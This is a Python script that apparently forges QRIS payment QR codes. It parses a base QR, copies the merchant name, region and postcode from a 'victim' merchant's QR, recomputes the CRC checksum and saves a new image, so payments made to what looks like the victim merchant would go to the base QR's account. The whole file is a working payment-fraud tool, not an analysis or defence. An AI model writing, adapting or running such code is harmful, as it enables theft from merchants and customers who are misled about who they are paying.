import cv2, qrcode
from pyzbar.pyzbar import decode

def parse(qris):
    index, data = 0, {}
    while index < len(qris):
        obj = qris[index:index+2]
        length = int(qris[index+2:index+4])
        value = qris[index+4:index+4+length]
        data[obj] = value
        index += 4 + length
    return data

def modify(data, name=None, region=None, postcode=None):
    if name: data['59'] = name
    if region: data['60'] = region
    if postcode: data['61'] = postcode
    altered = ''
    for obj, value in data.items():
        if obj == '63': continue
        length = f"{len(value):02}"
        altered += f"{obj}{length}{value}"
    altered += '6304'
    altered += checksum(altered)
    return altered

def checksum(data):
    bytes = data.encode('utf-8')
    crc, poly = 0xFFFF, 0x1021
    for byte in bytes:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000: crc = (crc << 1) ^ poly
            else: crc <<= 1
            crc &= 0xFFFF
    return f"{crc:04X}"

def create(data, out='altered.jpeg'):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(data)
    qr.make(fit=True)
    qr.make_image(fill='black', back_color='white').save(out)

try: baseqr = parse(decode(cv2.imread('baseqr.jpeg'))[0].data.decode('utf-8'))
except: baseqr = parse(decode(cv2.imread(input("Base QRIS : ")))[0].data.decode('utf-8'))
try:
    victim = parse(decode(cv2.imread('victim.jpeg'))[0].data.decode('utf-8'))
    name, region, postcode = victim.get('59'), victim.get('60'), victim.get('61')
except: name, region, postcode = input("Merchant name : "), input("Merchant region : "), input("Postal Code : ")

print("\nQRIS Altered")
print(f"Name: {baseqr.get('59')} -> {name}")
print(f"Region: {baseqr.get('60')} -> {region}")
print(f"Postcode: {baseqr.get('61')} -> {postcode}")
altered = modify(baseqr, name, region, postcode)
create(altered)